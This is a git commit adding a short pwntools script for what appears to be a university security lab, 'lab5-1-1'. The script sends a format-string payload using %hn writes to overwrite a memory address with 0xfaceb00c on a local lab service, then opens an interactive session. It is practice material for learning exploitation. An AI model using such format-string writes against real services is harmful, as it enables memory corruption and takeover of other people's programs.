1abfc6007a0262fd7508a5b21c96707874212224
Yasheed1995 <qwerty8608301@gmail.com>
2018-12-01 16:29:06 +0800

    lab5-1-1

---
+++ week6/Lab_5/1/1/lab5-1-1.py
@@ -0,0 +1,23 @@
+#!/usr/bin/env python
+from pwn import *
+
+#host, port = '60.251.236.18', 10129
+host, port = '127.0.0.1', 7126
+y = remote(host, port)
+
+a = 0x6012ac
+
+#p = '%20$p.'.ljust(0x20, ) + p64(a)
+#p = '%4207849484c%20$n.'.ljust(0x20, ) + p64(a)
+p = '%45068c%20$hn%19138c%21$hn%.'.ljust(0x20, '\x00') + p64(a) + p64(a+2)
+y.sendafter('name ?', p)
+
+#0xfaceb00c
+#0xb00c
+
+#0xface
+
+
+
+
+y.interactive()
